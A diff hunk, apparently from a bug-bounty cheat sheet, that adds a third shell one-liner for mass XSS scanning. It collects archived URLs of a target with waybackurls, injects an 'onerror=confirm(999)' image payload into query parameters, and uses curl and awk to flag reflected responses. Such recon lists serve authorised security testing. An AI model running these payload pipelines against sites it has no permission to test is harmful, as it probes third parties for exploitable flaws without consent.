@@ -893,6 +893,9 @@ echo "target.com" | gauplus | grep "?" | qsreplace 'xssz"><img/src=x onerror=con
 
 # method 2
 echo "target.com" | waybackurls | grep "?" | qsreplace 'xssz"><img/src=x onerror=confirm(999)><!--' | httpx -mr '"><img/'
+
+# method 3
+echo "target.com" | waybackurls | grep "?" | qsreplace 'xssz"><img/src=x onerror=confirm(999)><!--' | while read url; do curl -s "$url" | awk '/"><img\//' && echo "Potential XSS at: $url"; done
 ```
 
 
